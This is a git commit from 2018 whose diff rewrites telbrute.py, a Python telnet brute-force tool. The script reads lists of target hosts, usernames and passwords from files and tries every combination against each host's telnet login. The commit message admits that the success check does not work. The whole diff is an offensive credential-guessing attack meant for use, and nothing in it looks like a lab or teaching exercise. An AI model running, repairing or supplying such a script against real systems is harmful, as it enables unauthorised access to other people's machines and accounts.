2ce981c2373b4481672783f5e194f59b5101b253
TheOnionJr <sander.loken@gmail.com>
2018-12-07 02:10:28 +0100

    BF works, but dosent properly check if logged in or not

--- telbrute.py
+++ telbrute.py
@@ -1,18 +1,62 @@
 import getpass
 import sys
 import telnetlib
+import time
+#import argparse
 
-with open("targets.txt") as targets:							#List targets
-	for target in targets:									#Loop targets
-		tn = telnetlib.Telnet(target)							#Make telnet socket
-		tn.read_until("login: ")							
-		with open("users.txt") as users:						#List users
-			for user in users:								#Loop users
-				tn.write(user + "\n")						#Write user
-				tn.read_until("Password: ")					#Wait for password prompt
-				with open("data/passwords.txt") as passwords:		#List passwords
-					for password in passwords:				#Loop passwords
-						tn.write(password + "\n")			#Use password
-					tn.write("ls\n")						#ls
-					tn.write("exit\n")						#exit
-					print tn.read_all()						
+#parser = argparse.ArgumentParser()
+#parser.add_argument("-v", help="Verbosity", action="store_true")
+#args = parser.parse_args()
+
+noTargets = 0
+noUsers = 0
+noPwds = 0
+win = 0
+hosts = []
+users = []
+passwords = []
+result = [b'Login: ', b'Telnetd: Authorized login successful']
+
+
+
+
+print("Starting Telbrute...")
+#if args.v:
+	#print("Reading Targets...")
+
+#Reading all input data:
+with open("data/targets.txt") as trgs:
+	for trg in trgs:
+		noTargets = noTargets + 1
+		hosts.append(trg)
+
+with open("data/users.txt") as usrs:
+	for usr in usrs:
+		noUsers = noUsers + 1
+		users.append(usr)
+
+with open("data/passwords.txt") as pwds:
+	for pwd in pwds:
+		noPwds = noPwds + 1
+		passwords.append(pwd)
+
+
+#Login start:
+for host in hosts:
+	for user in users:
+		for password in passwords:
+			tn = telnetlib.Telnet(host)
+			tn.read_until("Login: ")
+			time.sleep(2)
+			print("Testing user: " + user)
+			tn.write(user + "\n")
+			tn.read_until("Password: ")
+			print("Testing password: " + password)
+			tn.write(password + "\n")
+			if tn.read_until(">",2) is None:
+				print("WIN!")
+				break
+			else:
+				print("Login Failed")
+			tn.close()
+				
